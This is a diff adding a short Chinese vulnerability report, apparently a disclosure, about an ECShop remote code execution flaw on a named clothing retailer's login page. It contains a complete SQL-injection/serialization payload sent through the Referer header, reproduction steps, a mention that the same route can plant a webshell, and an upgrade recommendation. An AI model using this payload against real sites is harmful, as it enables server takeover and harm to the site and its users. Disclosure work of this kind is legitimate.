@@ -1,0 +1,18 @@
+/user.php?act=login
+
+康福禄服饰用户登录处存在远程代码执行漏洞，可通过构造payload直接getshell，对网站以及用户造成巨额损失
+
+payload:
+
+554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca
+
+
+
+
+通过构造payload，可以在网站上运行自定义代码，也可以直接向后台写入webshell
+
+1.打开指定网址，进入用户登录界面，并使用fiddler抓包
+
+2.在数据包中添加referer头，里面含有能在对方服务器上执行phpinfo()函数的payload,重新提交后，可以发现成功执行了了phpinfo函数，漏洞存在：
+
+升级ecshop到最新版本
